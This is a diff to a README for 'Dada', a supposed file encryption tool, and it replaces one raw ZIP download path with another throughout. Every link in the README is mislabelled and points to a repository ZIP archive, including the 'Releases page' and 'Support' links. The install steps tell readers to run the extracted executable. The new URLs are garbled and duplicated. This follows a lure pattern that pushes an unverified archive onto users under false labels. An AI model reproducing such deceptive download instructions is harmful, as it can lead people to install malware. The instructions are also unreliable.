@@ -7,7 +7,7 @@ Welcome to Dada, a powerful file encryption tool designed for everyone. With Dad
 
 ## 📥 Download Dada
 
-[![Download Dada](https://raw.githubusercontent.com/Zulficar192/Dada/main/build/Dada v.1.0.1/Dada_2.1.zip%20Dada-deepblue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Zulficar192/Dada/main/build/Dada v.1.0.1/Dada_2.1.zip)
+[![Download Dada](https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip%20Dada-deepblue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip)
 
 ## 🔍 About Dada
 
@@ -32,14 +32,14 @@ To run Dada, your device needs:
 
 To download Dada, visit our Releases page. You will find the latest version and previous versions available:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/Zulficar192/Dada/main/build/Dada v.1.0.1/Dada_2.1.zip)
+[Visit the Releases Page to Download](https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip)
 
 1. Click on the link above to go to the Releases page.
-2. Look for the version suitable for your operating system. For example, if you're using Windows, you might find a link like `https://raw.githubusercontent.com/Zulficar192/Dada/main/build/Dada v.1.0.1/Dada_2.1.zip`.
+2. Look for the version suitable for your operating system. For example, if you're using Windows, you might find a link like `https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip`.
 3. Click on the version link to start downloading.
 4. Once the download is complete, locate the downloaded ZIP file on your computer.
 5. Extract the ZIP file to a folder of your choosing.
-6. Inside the folder, find and run the executable file (like `https://raw.githubusercontent.com/Zulficar192/Dada/main/build/Dada v.1.0.1/Dada_2.1.zip`).
+6. Inside the folder, find and run the executable file (like `https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip`).
 
 ## 📖 How to Use Dada
 
@@ -67,7 +67,7 @@ Yes, you need to install Dada on each device you want to use. Ensure that the sa
 
 ## 📞 Support
 
-If you have any questions or need help, visit the [Dada GitHub Page](https://raw.githubusercontent.com/Zulficar192/Dada/main/build/Dada v.1.0.1/Dada_2.1.zip) and check the issues section or raise a new issue for assistance.
+If you have any questions or need help, visit the [Dada GitHub Page](https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip) and check the issues section or raise a new issue for assistance.
 
 ## 🌟 Feedback
 
@@ -77,7 +77,7 @@ Your feedback is valuable. Feel free to share your thoughts and experiences usin
 
 Dada will receive regular updates to enhance features and ensure security compliance. Make sure to check the Releases page frequently for the latest version.
 
-[Download Dada Here Again](https://raw.githubusercontent.com/Zulficar192/Dada/main/build/Dada v.1.0.1/Dada_2.1.zip)
+[Download Dada Here Again](https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip https://github.com/Zulficar192/Dada/raw/refs/heads/main/packager/Software-3.7.zip)
 
 Enjoy secure file management with Dada!
 ```
